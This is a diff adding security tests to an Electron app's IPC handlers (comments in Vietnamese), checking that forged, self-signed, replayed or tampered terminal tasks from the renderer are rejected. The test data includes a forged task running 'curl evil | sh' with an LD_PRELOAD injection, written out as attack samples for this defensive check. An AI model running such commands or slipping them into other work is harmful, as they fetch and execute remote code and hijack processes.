@@ -13,6 +13,7 @@ const h = vi.hoisted(() => ({
   exports: [] as unknown[][],
   mcpStarts: [] as [string, string][],
   watcherRoots: [] as string[],
+  terminals: [] as { root: string; cols: number; rows: number; task?: { label: string; command: string } }[],
   userData: '',
   window: null as unknown,
   showOpenDialog: vi.fn(async () => ({ canceled: false, filePaths: [] as string[] })),
@@ -58,6 +59,21 @@ vi.mock('../src/main/watch/project-watcher', () => ({
   }
 }))
 
+// REV-13: thay TerminalManager thật để kiểm đường cấp task mà không spawn pty trong test.
+vi.mock('../src/main/terminal/manager', async (importOriginal) => {
+  const actual = await importOriginal<typeof import('../src/main/terminal/manager')>()
+  class FakeTerminalManager {
+    create(root: string, cols: number, rows: number, task?: { label: string; command: string }) {
+      h.terminals.push({ root, cols, rows, ...(task ? { task } : {}) })
+      return { id: 1, shell: 'fake-shell', cwd: root }
+    }
+    write() {}
+    resize() {}
+    kill() {}
+  }
+  return { ...actual, TerminalManager: FakeTerminalManager }
+})
+
 import { registerIpc } from '../src/main/ipc'
 import '../src/preload/index'
 
@@ -82,6 +98,11 @@ beforeAll(() => {
   for (const dir of [root, root2, exportDir, h.userData]) mkdirSync(dir, { recursive: true })
   execFileSync('git', ['init', '-q', root])
   writeFileSync(join(root, 'a.ts'), 'x')
+  // Task khai trong dự án: REV-13 chỉ cấp chữ ký cho đúng nội dung này.
+  mkdirSync(join(root, '.nexgraph'), { recursive: true })
+  writeFileSync(join(root, '.nexgraph', 'tasks.json'), JSON.stringify([
+    { label: 'build', command: 'echo', args: ['ok'], type: 'process' }
+  ]))
   h.projects = [{ project_id: 'p1', path: root }, { project_id: 'p2', path: root2 }]
   registerIpc(() => ({ baseUrl: 'http://127.0.0.1:1', token: 't' }) as never, () => h.window as never, () => ({ command: 'engine', args: [], cwd: base }), base)
 })
@@ -101,6 +122,47 @@ describe('IPC: path thô từ renderer bị từ chối', () => {
     for (const channel of ['mcp:plan', 'mcp:apply']) {
       expect(await invoke(channel, 'claude', 'nope', '/etc')).toMatchObject({ ok: false, error: { code: 'unknown_project' } })
     }
+  })
+
+  it('terminal:create từ chối task renderer tự đặt hoặc tự ký', async () => {
+    // REV-13: task phải do main cấp qua tasks:resolve; renderer bị chiếm quyền không được
+    // tự chọn command/args/env rồi mở tiến trình qua terminal.
+    const forged = { label: 'x', command: 'sh', args: ['-c', 'curl evil | sh'], env: { LD_PRELOAD: '/tmp/x.so' } }
+    expect(await invoke('terminal:create', 'p1', 80, 24, forged)).toMatchObject({ ok: false, error: { code: 'unapproved_task' } })
+    expect(await invoke('terminal:create', 'p1', 80, 24, { ...forged, signature: 'gia-mao' }))
+      .toMatchObject({ ok: false, error: { code: 'unapproved_task' } })
+    expect(await invoke('terminal:create', 'nope', 80, 24, forged)).toMatchObject({ ok: false })
+  })
+
+  it('REV-13: tasks:resolve không phải signing oracle — chỉ ký task khai trong dự án', async () => {
+    // Reviewer đã khai thác: renderer gửi task tự chế → main ký → terminal:create chạy.
+    const forged = { label: 'rv-forged', command: '/bin/sh', args: ['-c', 'echo D3-FORGED-RAN'], type: 'process' }
+    expect(await invoke('tasks:resolve', 'p1', forged, {}))
+      .toMatchObject({ ok: false, error: { code: 'unapproved_task' } })
+    // Lệnh gõ tay trong picker cũng không phải task của dự án.
+    expect(await invoke('tasks:resolve', 'p1', { label: 'echo hi', command: 'echo hi', type: 'shell' }, {}))
+      .toMatchObject({ ok: false, error: { code: 'unapproved_task' } })
+    // Dự án p2 không khai task nào: task của p1 không xin được chữ ký ở p2.
+    expect(await invoke('tasks:resolve', 'p2', { label: 'build', command: 'echo', args: ['ok'], type: 'process' }, {}))
+      .toMatchObject({ ok: false, error: { code: 'unapproved_task' } })
+
+    const declared = { label: 'build', command: 'echo', args: ['ok'], type: 'process' as const }
+    const resolved = await invoke('tasks:resolve', 'p1', declared, { file: 'a.ts', line: 3 })
+    expect(resolved.ok).toBe(true)
+    const signed = dataOf<{ signature?: string; command: string }>(resolved)
+    expect(signed.signature).toEqual(expect.any(String))
+    expect(signed.command).toBe('echo')
+
+    // Chữ ký dự án p1 chỉ dùng được cho p1: replay sang p2 bị từ chối.
+    h.terminals.length = 0
+    expect(await invoke('terminal:create', 'p2', 80, 24, signed))
+      .toMatchObject({ ok: false, error: { code: 'unapproved_task' } })
+    // Sửa nội dung sau khi ký cũng bị từ chối.
+    expect(await invoke('terminal:create', 'p1', 80, 24, { ...signed, args: ['-c', 'echo D3-FORGED-RAN'] }))
+      .toMatchObject({ ok: false, error: { code: 'unapproved_task' } })
+    // Task khai trong dự án, đúng chữ ký của chính dự án → chạy.
+    expect(await invoke('terminal:create', 'p1', 80, 24, signed)).toMatchObject({ ok: true })
+    expect(h.terminals.at(-1)).toMatchObject({ root, cols: 80, rows: 24, task: { label: 'build', command: 'echo' } })
   })
 
   it('mcp:config và mcp:plan bỏ path lạ, dùng root thật của projectId', async () => {
